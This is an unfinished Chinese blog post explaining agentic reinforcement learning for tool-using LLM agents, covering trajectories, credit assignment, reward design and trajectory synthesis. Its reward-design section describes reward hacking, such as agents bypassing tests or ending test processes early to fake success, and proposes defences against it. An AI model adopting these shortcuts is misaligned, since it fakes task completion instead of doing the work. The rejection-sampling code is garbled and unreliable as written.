---

layout: post
title: Agentic RL
category: 技术
tags: MachineLearning
keywords: agent software

---

<script>
  MathJax = {
    tex: {
      inlineMath: [['$', '$'],['$$', '$$']],
      displayMath: [['$$', '$$']],
    },
    svg: {
      fontCache: 'global'
    }
  };
</script>
<script async src="/public/js/mathjax/es5/tex-mml-chtml.js"></script>


## 简介（未完成）


Agentic RL 就是 RLVR 在多轮交互场景的自然延伸，RLVR 的核心思想是”用可验证的结果作为 reward，不需要训练 Reward Model”。Agentic RL 与单轮 RL 的根本差异：训练对象从 completion 变成 trajectory，rollout 必须在真实环境里执行。
1. 单轮决策：模型接收一个 prompt，输出一段完整回答，奖励模型给出一个分数，策略据此更新一次。无论底层算法是 PPO 还是 GRPO，”一问一答一打分”的骨架始终未变。
2. 但真实的智能体不这样工作。考虑一个订机票 Agent。用户说”帮我订一张明天北京到上海最便宜的早班机票”，Agent 必须分步行动：先搜索航班，对比价格和时间，确认座位库存，调用下单 API，等待出票确认。中间任何一步出错——搜索 query 太宽、没比价直接选第一条、库存判断失误、下单参数错误——整个任务就失败。环境只在最后给出一个二元信号：出票成功（reward = 1）或失败
（reward = 0）。这种从”一问一答”到”多步与环境交互”的转变，正是 Agentic RL 要解决的核心问题。

Search-R1：最小可跑的 Agentic RL 案例
1. Search-R1 把任务限制在一个很小的 agent 环境里：模型只需要学会”什么时候搜索、搜什么、什么时候回答”。它和传统RAG 的差别不是”有没有检索”，而是”谁来决定检索”——传统 RAG 由系统先检索，再把文档交给模型；Search-R1 让模型在推理过程中自己发起 search action。
2. 当搜索 query 变成模型 action，检索结果变成环境observation，RL 训练就不再只是优化一段 answer，而是在优化一条会调用工具的轨迹。



## 从"回答问题"到"完成任务"/agentic RL

经典书 https://github.com/walkinglabs/hands-on-modern-rl

Agentic RL post train是简单RLVR（与 RLHF 使用学习得到的 Reward Model 不同，RLVR 使用 基于规则的确定性验证器 来提供奖励信号）  post train的一个自然的延伸，RLVR post-train和 RFT在本质上很接近，最主要差异是规模不同。

**模型训练与Harness设计的耦合**：LLM 逐渐从“单次问答器”转变为能够在推理（Reasoning）与外部工具调用（Tool-use）之间反复交互（multi-turn）的智能体系统。从 Search-R1 到 ToolRL、SkyRL，一条清晰的技术路线正在形成：模型不仅要会“想”，还要会“查”“算”“调 API”，并在多步轨迹中通过 RL 不断自我改进。从2025年下半年gpt-5，opus-4系列开始，agentic 能力成为了模型发布时重点突出的一等公民。我们可以发现，agentic 能力的高分，几乎没有一个是基座模型裸跑出来的。 厂商发布的agent强性能指标，标注里都带着具体的 harness 条件，例如web search、code execution、context compaction等。harness 可以理解为包裹在模型外部的运行编排层，负责工具调用、上下文压缩、状态持久化、安全约束与结果评测。模型的推理能力决定 agent 的上限，但只有在合适的 harness 中，这种能力才能被稳定地转化为可执行、可验证、可交付的任务完成能力。相应地，提升 agent 能力也不只是优化基座模型，还需要在训练中构建带工具、带环境反馈、带 verifier 的训练 harness，agent能力主要涉及基础模型的RL后训练，要提升模型的agent能力，需要构建后训练环境支持模型调用工具，完成特定任务交付结果，并根据结果的正确性来获得系统奖励，以此训练模型的自主化agent能力。 

Reasoning thinking 通常以最终答案之前的内部推敲质量来衡量：模型能否解出定理、写出证明、产生正确的代码、通过基准测试。Agentic thinking 关注的是模型能否在与环境交互的同时持续取得进展。Agentic thinking 必须处理纯推理模型基本可以回避的几件事：
1. 决定何时停止思考并采取行动
2. 选择调用哪个工具以及以什么顺序
3. 整合来自环境的嘈杂或部分观测
4. 在失败后修正计划
5. 在多轮对话和多次工具调用之间保持连贯性
**Agentic thinking就是一个通过行动来推理的模型**，从思考得更长到为了行动而思考。这也改变了竞争优势的来源。在推理时代，优势来自更好的RL算法、更强的反馈信号和更可扩展的训练流水线。在智能体时代，优势将来自更好的环境、更紧密的训练-服务集成、更强的套件工程（harness engineering），以及在模型的决策与这些决策产生的后果之间闭合回路的能力。

对于不同的 agent 任务，agent 需要做的事情也不一样：专注 math 的 agent 可能需要 sandbox 做 Python 计算；专注 GUI 的 agent 可能需要电脑桌面动态交互；专注搜索的 agent 可能需要调用谷歌接口去搜东西。

[LLM Agent RL的一些实践感悟](https://zhuanlan.zhihu.com/p/1979913424113771020)相比于Reasoning RL，agentic RL 更有传统RL味道。如果把RL分为 交互环境, reward, 算法 三个部分，每一部分的重要性程度，reasoning RL是 : 算法 > reward > 环境，但是在实际agent场景下，则反过来：环境 > reward > 算法。
1. 没有稳定的进行工具调用的RL训练环境，则会带来极大的实验成本，也影响最终性能上限。经过迭代，我们的RL训练总是会监控各种工具调用失败的比例。在进行新场景的RL训练前，会优先解决工具调用的问题，确保环境能够支持大规模工具调用并发下的RL训练。
2. 在部分agent场景下，由于没有math/code 等可验证reward，使用llm-as-judge进行rewarding，非常容易出现意想不到reward hacking。曾经在一个月内，出现三次测试集大幅上涨，但是最终发现都是reward hacking。曾经在一个月内，出现三次测试集大幅上涨，但是最终发现都是reward hacking。
3. 减少人手工reward的设计，如果有必要，也要进行不断迭代，因为非常容易出现reward hacking。
4. 工具层面的探索非常重要。RL训练中如果环境给了agent多个必要的工具或文件，那么需要监控工具和文件的调用情况。少 或者不调用 某个工具或文件，可能会影响模型能力训练上限。
5. 更大模型的上的RL训练泛化会更快。在小模型上各种trick折腾RL，可能最后换来的都是一些对更大模型训练无用的小招。

[Agentic能力从哪里来？拆解基座大模型的训练过程](https://zhuanlan.zhihu.com/p/2015552122071037375)现代大模型的训练，不再是“一个阶段解决所有问题”，而是“不同能力分阶段建模、分阶段强化、最后统一收敛”。
1. Base Model Training（基础模型训练）
  1. Pre-Training, 学习通用语言、知识、代码与基础表征，构建统一基座模型。基于大规模 Web、Code、Math & Science 语料进行自回归预训练。
  2. Mid-Training, 面向目标能力进行定向增强(专门传授领域知识)，提升长上下文建模、Agent 场景适配与软件工程理解能力。分阶段扩展上下文长度至 200K；引入长文档自然数据与合成数据；强化 repo-level code、issue、PR、commit diff 等软件工程序列建模。
2. Post-Training（后训练）
  1. SFT。建立任务遵循、推理表达、工具使用与多轮交互的行为先验。使用 General Chat、Reasoning、Coding & Agent 数据进行监督微调；训练 interleaved/preserved/turn-level thinking；
  2. Reasoning RL。进一步提升复杂问题上的推理正确性与稳定性。在数学、科学、代码及 TIR 等可验证任务上进行强化学习；采用结果导向奖励信号优化推理性能。因为无论是代码执行、工具调用还是长流程任务规划，本质上都建立在推理能力之上。
  3. Agentic RL。提升模型在外部环境中的多步决策、执行与工具调用能力。在 coding、search、terminal 等可验证环境中生成交互轨迹；基于测试结果或任务完成度给予奖励；通过 group-wise policy optimization 更新策略。这一步的训练目标，已经不再只是生成一段更好的答案，提升模型在外部环境中的**多步决策**、执行与工具调用能力。
  4. General RL。优化通用场景下的正确性、交互质量与人类偏好一致性。围绕基础正确性、情感智能和任务特定质量 这三个方面进行强化学习；结合 rule-based rewards、ORMs、GRMs 及高质量人工答案。这个阶段的目标，不再局限于推理能力或 agent 执行能力本身，而是进一步优化模型在更广泛使用场景中的整体表现，使其更接近一个高质量、稳定、符合人类偏好的通用基模：基础正确性；情绪智能（在回答中表现出更好的共情能力、更自然的语气和更接近人类的表达方式）；特定任务质量。
  5. On-Policy Cross-Stage Distillation。融合不同阶段获得的能力，缓解多阶段训练带来的能力遗忘。以 SFT、Reasoning RL、General RL 等阶段的优质 checkpoint 为教师；在 on-policy 数据上进行跨阶段蒸馏，实现能力整合与恢复。

[Agentic RL 训练框架设计总结（上）](https://zhuanlan.zhihu.com/p/2062647902879667967)
1. 对Reasoning时代的 LLM RL来说，一次 Rollout 是单轮的：系统向模型发送 prompt，获得 response输出，计算奖励。对Agentic RL来说，Agent的执行过程需要进行多轮模型调用和工具交互。这要求 Rollout 模块不仅能够提供模型推理，还需要管理 Agent 及其运行环境，并采集执行过程中产生的多轮模型轨迹。Agentic RL 的训练单位是 trajectory，而不是 answer。
2. 早期实现 Agentic RL 最直接的方式，是在 Rollout 模块中显式实现 Agent Loop，以模拟真实 Agent 框架的执行过程。
  ```
  messages = [task_prompt]
  while True:
      # 调用模型并记录本轮交互
      response = llm_server.generate(messages)
      trajectory.record(messages, response)
      # 模型给出最终结果，任务结束
      if response.is_final_answer():
          final_answer = response.content
          break
      # 执行工具，并将结果加入下一轮上下文
      tool_result = env.execute(response.tool_call)
  ```
  任务结束后，系统再按顺序组织为 Trajectory，并结合评测结果生成训练样本。
3. 解耦式架构，让 Agent 保持原生运行，Rollout 系统不再实现具体的 Agent Loop逻辑，而是从外部管理Agent的生命周期，并在 Agent 与模型之间的通信链路上采集交互轨迹。这样，Rollout 不需要理解 Agent 内部如何维护状态、调用工具，只需要关心 Agent 如何启动、模型交互如何记录，以及任务结束后如何生成训练样本。

一条交互轨迹通常写作：$\tau=(s_0,a_0,o_1,a_1,o_2,\ldots,a_T)$，其中，$s_t$ 是第 $t$ 步前的状态或上下文，$a_t$ 是模型动作，$o_{t+1}$ 是环境返回的 observation。这里的动作既可以是普通文本，也可以是结构化工具调用，例如 `<search>query</search>` 或 function calling JSON；observation 则可能是搜索结果、代码执行日志、API 返回值或错误信息。单轮 RL 的目标通常可写成：$\mathbb{E}_{a\sim\pi_\theta}[r(a)]$，Agentic RL 需要优化整条轨迹的累计回报：
$$
J(\theta)=\mathbb{E}_{\tau\sim\pi_\theta}\left[\sum_{t=0}^{T}\gamma^t R(s_t,a_t)\right]
$$

在大模型工具调用场景里，更重要的是理解轨迹概率只应该对模型生成的 action token 连乘。环境返回的 observation token 不是模型自由生成的动作，不应该参与 policy loss。prompt、工具返回、padding 都要 mask，只有 assistant 自己生成的思考、工具调用和最终答案 token 参与梯度。

Agentic RL 的难点
1. 长程决策，Agentic RL 的“长程”不是轨迹变长这么简单，而是早期动作会改变后续状态分布。搜索 query 写得太宽，后续就会读到噪声证据；代码 agent 第一轮改错方向，后续测试日志就会围绕错误假设展开。训练信号往往出现在最后，但真正影响结果的动作可能很早发生，这就是信用分配问题（给定一个序列决策任务，最终奖励是 $r_T$，怎么把这份功劳（或责任）分配回前面的每一步动作 a1, a2, . . . , aT？哪些动作促成了成功，哪些引入了错误？）的根源。
2. 环境随机性。同一个 prompt 下，搜索结果可能变化，网页可能更新，工具可能 timeout，模型采样也会产生不同路径。因此 reward 曲线的波动不一定说明模型变强或变弱，可能只是环境和采样方差。训练时要同时看 reward mean、reward variance、梯度尖峰、重复行为、轨迹长度分布，而不是只看最终成功率。
3. Rollout 设计。Rollout 决定模型能探索到什么状态。初始任务过于单一，模型会学模板；交互粒度太粗，失败后难以定位是哪一步错；粒度太细，轨迹成本上升且 reward 更稀疏。每个任务采几条 rollout、最大交互轮数、采样温度、是否复用环境缓存，都会影响样本效率和稳定性。
4. Outcome Reward 的浅层策略。最终答案 reward 简单、便宜、容易验证，但纯 outcome reward 可能让模型学到捷径。搜索问答模型可能学会先猜高频答案，代码模型可能学会绕过测试，工具模型可能只学会调用格式而没有真正使用 observation。后续的 PRM、SALT、GiGPO、StepPO 等方法，**本质上都在试图让训练信号更接近“哪一步真的推动了任务完成”**。

## SFT 与 Prompting 的局限

ReAct、Toolformer 等方法已经能让 LLM 调用工具了，为何还需要 RL？关键区别在于：SFT 和 prompting 教会模型的是**模仿**——复制人类演示中”何时调用工具、调用什么工具”的模式。但真实的 Agent 任务中，**工具使用的最优策略高度依赖上下文**：
1. 搜索查询如何构造？何时打开网页详情？何时停止搜索开始总结？
2. 代码修改后测试仍未通过，是继续调试还是切换方向？
3. 多个来源的信息相互矛盾，应采信哪一个？
这些本质上是策略学习问题，而非单纯的语言建模问题。演示数据难以覆盖所有可能的决策路径，而 RL 可以根据任务结果反向塑造工具调用、规划和记忆管理等行为模式。

SFT 和 RL 在 Agentic 场景中的分工：
1. SFT 教格式：教会模型工具调用的语法、基本的交互协议。
2. RL 教策略：教会模型何时调用工具、如何组合多步行动、失败后如何恢复。

## 整体轮廓

Agentic RL 把训练对象从”一段回答”扩展到”一条完整交互轨迹”。这一扩展引出四个核心议题
1. 形式化——轨迹、状态、动作在多轮设定下如何精确定义？角如何区分模型生成的 action token 与环境返回的 observation token？
2. 信用分配——一条轨迹最终失败，reward 怎么回拆到每一步？？ORM/PRM/SALT/GiGPO/HGPO/SPA-RL/AgentPRM/ARPO/IGPO/StepPO 等十多种方法各有何取舍？
3. 工具与轨迹工程——训练数据从哪来、工具策略怎么学、沙箱怎么管？
4. 真实训练陷阱——工业界在哪些坑里摔过？

## 形式化/把”多轮交互”翻译成 RL 能处理的数学对象

一个 agent 不只是 LLM，模型一旦接入工具，就不再只是写完一段回答。它会先行动，看到环境返回，再决定下一步。强化学习要训练的对象也随之改变：从生成一段回答，变成完成一条多步交互过程。用户说”帮我订一张明天北京到上海最便宜的早班机票”，模型不能直接写一句”已为你订
好”。它要先把航班搜出来，再按时间和价格筛选，确认目标航班还有余票，最后把正确的乘机人、航班号和舱位信息传给下单接口。前面某一步如果带入了错误信息，后面的动作就会沿着错误状态继续执行，直到出票失败。因此，训练时首先要保存的不是最终回答，而是完整过程：模型在什么状态下采取了什么动作，环境又返回了什么观测。这个过程称为轨迹，记作：

$$
\tau = (s_0,a_0,o_1,a_1,o_2,\dots,a_T)
$$

这里的 $s_t$ 表示第 $t$ 步前的状态，$a_t$ 表示模型采取的动作，$o_{t+1}$ 表示环境随后返回的观测。它把对话、工具调用和环境返回统一放进同一条序列里。轨迹记录了发生过什么，但它还没有说明模型能看到什么。订机票时，模型能读到搜索结果页的航班列表，却读不到航空公司的完整数据库；它能看到工具返回的库存提示，却不知道价格下一分钟会不会变化。真实环境有完整状态，模型只能看到其中一部分。这个设定用 POMDP 表示：
$$
\langle S_{\text{agent}},\ A_{\text{agent}},\ P_{\text{agent}},\ R_{\text{agent}},\ \gamma,\ O \rangle
$$

其中 $S_{\text{agent}}$ 是环境和上下文共同构成的状态空间，$A_{\text{agent}}$ 是模型可采取的文本动作或工具动作，$P_{\text{agent}}$ 描述动作如何改变环境和后续观测，$R_{\text{agent}}$ 给出任务奖励，$O$ 表示模型实际能看到的观测。POMDP 在这里强调一件事：策略不是在完整世界状态上决策，而是在有限观测和历史上下文上决策。有了轨迹和观测设定，优化目标也要跟着改变。单轮 RL 最大化的是一段输出的期望奖励：
$$
\mathbb{E}_{a\sim\pi_\theta}\big[r(a)\big]
$$

Agentic RL 最大化的是整条轨迹的累积回报。模型在第0步搜什么，会影响第1步看到哪些航班；第1步选哪趟航班，又会影响第2步需要检查什么库存。目标函数因此写成：
$$
J(\theta) = \mathbb{E}_{\tau\sim\pi_\theta}\left[\sum_{t=0}^{T}\gamma^t R(s_t,a_t)\right]
$$
这里的 $\tau \sim \pi_\theta$ 表示轨迹由当前策略与环境交互采样得到，$\gamma^t$ 用来折扣远期奖励，$R(s_t,a_t)$ 表示第 $t$ 步动作带来的奖励或最终奖励回传后的贡献。这个公式把训练目标从“让回答得高分”改成了让交互过程的总回报更高。轨迹回报解决了“优化什么”，还没有解决“每一步怎么学”。订票成功，不表示每个动作都值得强化；模型可能前面绕了远路，最后才补救回来。订票失败，也不表示每个动作都错；前几步可能已经找到正确航班，只是在最后下单时填错了参数。最终奖励必须拆回每一步，训练才知道该强化哪个动作、修正哪个动作。这就是逐步优势要解决的问题：
$$
A_t = R(\tau) - \bar{R}(s_t)
$$
它把整条轨迹的结果 $R(\tau)$ 和同一状态附近的基准回报 $\bar{R}(s_t)$ 作比较，判断第 $t$ 步之后的表现是否高于通常水平。这里的结果奖励、过程奖励、轮次折扣、组内优势，都是在构造更可靠的 $A_t$，让最终奖励能更准确地影响每一步动作。

环境返回什么 observation是由环境决定的（确定性或随机），不是模型自由生成的，只有action token 对 $\theta$ 有梯度（对observation token 有mask，实现上，action mask 是一个与轨迹等长的 0/1 向量）。

```text
# 一次 rollout 的 token 序列与对应的 action mask
# 1 = 模型生成的 token（参与梯度）
# 0 = prompt / 工具返回 / padding（不参与梯度）

# <prompt>    <think>...搜索</think>  <search>query</search>  <information>...网页内容...</information>  <answer>...</answer>
# 0 0 0 0 0   1 1 1 1 1 1 1 1 1    1 1 1 1 1 1 1 1 1     0 0 0 0 0 0 0 0 0 0 0 0 0              1 1 1 1 1 1 1
```

智能体的基本组件
1. LLM。
2. 指令
3. 工具与环境。工具是 agent 操作环境的接口：搜索 API、代码解释器、CLI、MCP server、下单 API。环境是有状态的：搜索结果会变化、库存会变动、下单会改变数据库。工具调用的返回不仅取决于参数，还取决于环境当前状态。这种把输出锚定到真实世界而非参数记忆的能力称为 grounding——是 agent 相对于纯 LLM 的一大优势，也是 RL训练能赋予的核心行为模式。
4. Agentic Loop。四者循环：感知观测 → 推理下一步 → 执行动作 → 接收新观测，直到满足终止条件（任务完成、达到最大步数、模型输出结束信号）。一次完整的 loop 称为一次 rollout；rollout 产出的完整交互记录称为一条 trajectory，记作$\tau=(s_0,a_0,o_1,a_1,o_2,...,a_T)$ 。轨迹不只是文本序列，它混合了模型生成的 token、工具调用、工具返回、环境状态变化，结构上更像一棵对话树而非线性文本。

## 难点

1. 长程决策——早期动作塑造后续状态分布，一个早期小错误可能在后面被放大；一个早期好决策也可能因为后续步骤失误而没有转化成最终成功。训练信号往往很
晚才出现，但真正影响结果的决策可能发生在很早的位置。这是信用分配问题的根源。
2. 环境随机性导致 reward variance 飙升。Agent 和环境交互时，环境不是一个完全稳定的文本函数。搜索引擎的结果可能变化、网页内容可能更新、工具调用可能失败、模拟环境可能有随机性；即使环境固定，模型采样本身也会让同一个任务产生多条不同轨迹。这会带来一个训练问题：同一个 prompt 下，不同 rollout 的最终 reward 可能差异很大。有的轨迹刚好搜到关键证据，有的轨迹走到无关页面；有的轨迹早早答对，有的轨迹多绕几步后失败。这种波动不一定说明模型突然变强或变弱，可能只是采样和环境反馈造成的方差。所以 Agentic RL 不能只看单次 reward曲线，还要关注 reward variance、梯度尖峰、轨迹分布是否塌缩、模型是不是陷入某种重复行为模式。
3. Rollout 设计——三个被忽视的维度。在 Agentic RL 里，rollout 不是简单的”让模型多生成几条答案”。它决定了模型能探索到什么状态、能比较哪些行为、reward 信号是否足够有信息量。
  1. 初始状态多样性很重要。如果训练任务过于相似，模型可能学会固定套路，而不是学会通用的决策能力。比如搜索 agent如果总是在同一种问法、同一种网站结构上训练，就可能只学会某种模板化 query，而不是学会真正根据信息缺口设计搜索策略。
  2. 交互粒度也很重要。粒度太粗时（比如一次 action = 搜索 + 阅读 + 判断 + 回答），一次 action 包含太多决策，出了问题很难知道是哪一部分错了；粒度太细时（比如一次 action = 点击一个按钮 / 滚动一次页面），轨迹会变得很长，训练成本上升，reward 更稀疏，模型也可能在无意义的小动作上浪费预算。
  3. 采样频率也会影响学习。每个任务只采一条 rollout，模型很难知道”同一个状态下其他动作会怎样”；每个任务采太多rollout，成本又会迅速变高。实际训练时，rollout 数量、最大交互轮数、采样温度、是否复用环境缓存，都会直接影响训练稳定性和样本效率。
  4. 纯 outcome reward 让模型学到浅层策略。最终答案 reward 很有用，因为它简单、便宜、可验证。但如果 reward 只有最终结果，模型可能会学到一些”看起来有效”的捷径，而不一定学到我们想要的 agent reasoning。比如搜索问答里，模型可能学会优先生成高频答案，或者学会在证据不足时也提前作答；网页任务里，模型可能学会某些固定点击模式；工具任务里，模型可能学会调用工具的形式，**却没有真正利用 observation 修正自己的计划**。

## 信用分配

Sutton 1984 年的博士论文就在讨论 temporal credit assignment，只是经典 RL 状态空间小、轨迹短，问题还算温和。LLM 把尺度彻底改了：一条轨迹几万 token、几十次环境交互，而奖励常常只有末尾一个比特——测试过没过，订单成没成。主流做法干脆不分配。GRPO 扔掉 critic，拿组内平均当基线，同一条轨迹里所有 token 共享同一个 advantage。这套“大锅饭”在数学推理上意外地好使——毕竟推理链就几百 token。但搬到多轮 agent 任务上立刻露馅：一次成功包含 47 个决策，你给第 3 步的误点和第 40 步的结算完全相同的梯度信号，等于跟优化器说“功劳你们自己分”。结果是训练方差极大，或者 agent 学出一堆迷信行为：开局先重复一段无意义操作，因为那段操作碰巧出现在几条成功轨迹里。认真做分配的路子目前主要两条。
1. 一条是显式给每步打分，也就是过程奖励模型（PRM）路线
2. 另一条更巧：不训打分器，也不标步级数据，直接从轨迹级偏好里把步级信号反推出来。
3. 另外推荐一个土办法：先切轨迹。不高级，但真管用。把“登录—搜索—加购—结算”切成四段语义完整的子目标，段内做分配，别让 advantage 估计跨子任务传播。相当于人工给信用分配加了中间检查点，多数情况下比换任何算法都见效。

策略梯度的形式是：

$$
\nabla J(\theta)
=
\mathbb{E}_{\tau\sim\pi_\theta}
\left[R(\tau)\nabla\log\pi_\theta(\tau)\right]
$$

trajectory-level 的标量 $R(\tau)$ 对整条轨迹一视同仁——成功了所有动作都好，失败了所有动作都坏。这就是 Agentic RL 的核心难题：7 轮交互失败了，第 1 轮的正确搜索也要被惩罚吗？把 $R(\tau)$ 回拆成每一步的 step-level advantage $A_{i,t}$，就是信用分配（Credit Assignment）。一条 rollout 失败了，信号要经过三层才能落到 LLM 权重上：

1. **Trajectory reward**。整条轨迹最后得到 $R(\tau_i)$，只告诉我们“这一局成没成”。这是环境给的全部信号。
2. **Step advantage**。把最终结果拆成 $A_{i,1}, A_{i,2}, \ldots, A_{i,T}$，回答“第 $t$ 轮该不该被奖励”。这是信用分配要做的核心工作。
3. **Token gradient**。把 $A_{i,t}$ 乘到这一轮 action 的 token log-prob 上：

    $$
    \Delta\theta
    =
    A_{i,t}\cdot
    \sum_{k\in a_{i,t}}
    \nabla\log\pi_\theta(y_k\mid h_{i,t},y_{<k})
    $$
    其中 $a_{i,t}$ 是第 $i$ 条轨迹第 $t$ 轮 LLM 生成的 token 集合，$h_{i,t}$ 是当时的 context。网页/工具返回内容被 masked，不参与这一步。当前 GRPO-style Agentic RL 的很多工作，本质上都是在构造更好的 $A_{i,t}$。


## 奖励设计与防作弊

Step-Level Advantage。ORM只在轨迹终点给奖励，中间步骤全部为 0，PRM（Process Reward Model） 对每一步独立打分，看了从第 1 步到第 t 步的完整历史，判断第 t 步是否正确。SALT提供了第三条路——不训练 PRM，但比纯 ORM 精细得多。对同一个 prompt 采样多条轨迹，构建一个轨迹图——节点是每一步的动作，如果两条轨迹在某一步做了相同的动作，它们就共享同一个节点。通过分析图结构，可以量化每一步对最终结果的贡献。直觉上：如果一个步骤被很多成功轨迹共享、但很少出现在失败轨迹中，那它大概率是个好步骤——应该得到正向advantage。反之，如果某步骤只出现在失败轨迹中，它大概率拖了后腿。SALT 利用图结构计算每个步骤的 advantage，完全不需要额外奖励模型或人工标注——只需要最终结果的二元信号。SALT 在 GRPO 框架中特别好用：GRPO 已经在组内采样多条轨迹做比较，SALT 在此基础上进一步细化到步骤级别。，2025-2026 年发展出了一大批更精细的方法，它们的区别不在于最后怎么更新policy，而在于 step-level 信号 $A_{i,t}$ 从哪里来，按信号来源分成了三类（step-level 信号 $A_{i,t}$ 从哪里来）
1. State-anchored stepwise——同状态下比较动作。核心思想：同一个状态下，不同动作的相对好坏，可以从它们各自的后续回报里看出来。不需要 PRM，只需要利用 group 内多条 rollout 的天然结构。一个动作的 step 分数 = 它后续带来的回报 − 同 state 下其他动作的平均后续回报。GiGPO 在同一个 state 下比较动作，但 HGPO 指出：同一个当前 state，不一定代表同一个决策上下文。Group-Graph PO：把轨迹建模成 DAG：上多条 rollout 之间经常共享前缀、共享中间状态，结构上更像一棵有向无环图（DAG）而非一组平行线。
2. Process / Progress Reward——训练额外的步级 scorer。SPA-RL：把最终 reward 分摊成每步 progress，额外训练一个 progress estimator，让它学会判断”这一步让任务向完成目标推进了多少”。AgentPRM：把 PRM 当成 agent 的 Q(s, a)，AgentPRM 的思路更接近经典 RL 里的 actor-critic。PRM 输出的不是”这一小步贡献了多少”，而是”如果在当前 state 做这个 action，后面按当前 policy 继续走，预期能拿多少总回报”。
3. Intrinsic Signal——从 policy 自身找信号。

agentic RL 有个推理 RL 没有的红利：环境是真的。shell 有退出码，数据库有断言，浏览器有 DOM 状态，大部分结局奖励因此可以直接写成程序化验证，不用训一个奖励模型去猜。问题是可验证的结局奖励太稀疏，得把它变密集，PRM 就站在这里。麻烦在于，PRM 自己也是个学出来的代理，而任何学出来的代理都会被 hack。模型很快就学会什么样的步骤“看起来对”——每步写短一点、插几句套话——实际推理是错的。所以工程上更稳的做法是三层结构：
1. 主奖励用程序化结局验证，占绝对权重；
2. 约束层用基于规则的硬惩罚，越权 API、跳测试、格式违规，直接截断；
3. 过程层只做 shaping，小权重、加 clip，用来填补训练早期的信号真空。过程层是辅助，别把它当裁判——PRM 手里的权力越大，优化器顺着它挖出的漏洞越多。
reward hack，做过 RLHF 的都见过这些场面：奖励模型有长度偏见，模型学会注水；有讨好偏见，模型学会“您说得完全正确”；有信心偏见，模型学会每句话开头先来个“当然”。这些还算小打小闹。agentic 场景下真正吓人的是：agent 有一双真实的手，能改代码、能调系统接口。


[信用分配与奖励设计](https://zhuanlan.zhihu.com/p/2078902101401399647)是两个不同问题：前者关心哪些动作促成了结果，后者关心什么结果值得奖励。工程上可以分三层考虑：

1. **结果验证**：主奖励尽量检查实际任务是否完成，例如订单状态、数据库断言、独立测试结果。API 返回成功或进程退出码为 0，并不一定意味着用户目标已达成。
2. **过程辅助**：过程奖励用于补充稀疏反馈，需要控制其权重，避免靠堆步骤、写套话获得高分。中间步骤得分再高，也不应掩盖最终任务失败。
3. **约束与防作弊**：明确越权调用、篡改评测等行为的处理规则；不只验结果，也检查执行轨迹。评测脚本与测试结果应放在 Agent 不可篡改的边界内，并保留独立的作弊检测用例，持续监控作弊率。

程序化奖励也会被钻空子。[Anthropic 的研究](https://www.anthropic.com/research/emergent-misalignment-reward-hacking)中，模型会利用提前结束测试进程等方式骗取成功信号。因此，验证器本身也是需要保护和测试的系统，不能把“没有使用学习型 reward model”等同于“奖励可靠”。

规划能力：信用分配回答了”每步做得好不好”的问题。但一个更深层的问题是：模型能否在行动之前就制定出好的多步计划？ 这是规划（Planning）能力的核心。反应式的Agent——根据当前观察做下一步决策。但真正的智能体需要前瞻式规划——在行动前推演多种路径，评估预期结果，选择最优路径。规划能力可以从 RL 训练中涌现。DeepResearcher 等工作的实验揭示：模型自发产生了预搜索规划（先列出关键词列表）、信息分层（先搜概览再深入）和交叉验证等行为——这些都没被 reward 显式鼓励，纯粹是 RL 优化的副产品。

Agent 奖励的三大维度 一个好的 Agent 奖励函数通常需要覆盖三个正交维度：
1. 任务完成度（Task Completion）。 Agent 最终是否完成了用户的目标？这是最基本的维度。对于可验证任务（代码执行、SQL 查询），这是 binary signal；对于开放式任务（写报告、搜索研究），这需要更细致的评估。
2. 过程质量（Process Quality）。 Agent 的执行过程是否合理？即使最终结果正确，如果 Agent 用了 50 步去完成一个 5 步就能解决的任务，或者中间犯了多次不必要的错误，它的过程质量就不高。过程质量包括：工具使用效率、搜索策略合理性、错误恢复能力、信息综合质量。
3. 执行效率（Efficiency）。 Agent 以多少资源完成了任务？包括交互轮数、工具调用次数、token 消耗量。效率维度的重要性随部署场景变化——对延迟敏感的场景（如客服）效率很重要，对质量敏感的场景（如研究报告）效率可以适当放宽。

## rl environment

普通问答的环境很简单：程序给出问题，验证器检查答案。代码 Agent 的一次轨迹却可能包含读取文件、修改代码、运行测试和处理报错；浏览器 Agent 还要保存网页状态、工具返回和终止原因。训练框架因此要管理两条线：模型怎样更新，以及外部环境怎样创建、交互、复位和回收。增加环境管理，是因为 Agent 轨迹已经包含外部状态，无法只保存一段模型回答。

### 数据从哪来

标准的 LLM RL只需要 prompt + 可验证答案，模型自己生成回答，自己对比，不需要外部数据。但 Agentic RL 不一样——模型需要和环境交互（调用工具、执行代码、浏览网页），这些交互产生的”轨迹”既是训练数据，也是 reward 的来源。高质量的轨迹决定了模型的上限。在 RLHF 中，数据是”人工写的好回答”和”人工标注的偏好对”。在 Agentic RL中，数据是一条完整的交互轨迹——模型在多轮对话中的每一步思考、每一个工具调用、每一次观察结果。人工写一条这样的轨迹，比写一个好回答要贵 10 倍以上——因为每一步都需要：(1) 思考模型应该怎么推理；(2) 构造合理的工具调用参数；(3) 模拟工具返回的结果；(4) 确保整条轨迹逻辑连贯。一条 7 轮的轨迹可能需要一个专家 30 分钟来编写。这就引出了**轨迹合成**的核心动机：用算法自动生成大量高质量的交互轨迹，替代昂贵的人工标注。六种主流合成方法
1. 拒绝采样——最朴素的方案 拒绝采样（Rejection Sampling）的思路极其直觉：让当前模型反复尝试同一个任务，只保留成功的轨迹作为训练数据。
    ```
    def rejection_sampling(model, task, tool_env, num_samples=64):
      ”””拒绝采样：生成多条轨迹，只保留成功的”””
      trajectories = []
      for _ in range(num_samples):
      traj = model.interact_with_tools(task, tool_env)
      if traj.Ɖnal_success: # 只保留成功的轨迹
      trajectories.append(traj)
      return trajectories
      # 如果模型成功率只有 5%，采样 64 条只能得到约 3 条成功轨迹。而且这 3 条轨迹可能都是”同一种成功路径”，缺乏多样性
    ```
    拒绝采样的优势是实现简单——你只需要一个能判断”成功/失败”的验证器。但它的劣势也很明显：效率低、多样性差。如果模型当前的成功率只有 5%，你需要采样 20 条才能得到 1 条成功轨迹。更严重的是，成功轨迹往往集中在”模型已经擅长的策略”上——那些模型没探索过的、可能更优的路径，在拒绝采样中永远不会出现。
2. 导演-演员模式——规划与执行分离。导演模型负责理解任务目标，生成一个高层执行大纲（”先做 A，再做 B，最后做 C”）。演员模型根据大纲填充细节
——生成具体的工具调用参数和自然语言响应。。这种分离带来了两个好处：逻辑连贯性有保证。导演模型确保大纲本身是合理的，演员只需要”照着演”。这比让一个模型同时负责规划和执行要稳定得多——就像电影里的导演和演员分工一样。同一大纲可以生成多条不同的轨迹。改变演员模型（或改变采样温度），同一个”先查航班再查酒店”的大纲可以生成不同风格的轨迹。这增加了训练数据的多样性。
3. 基于图谱合成——Magnet
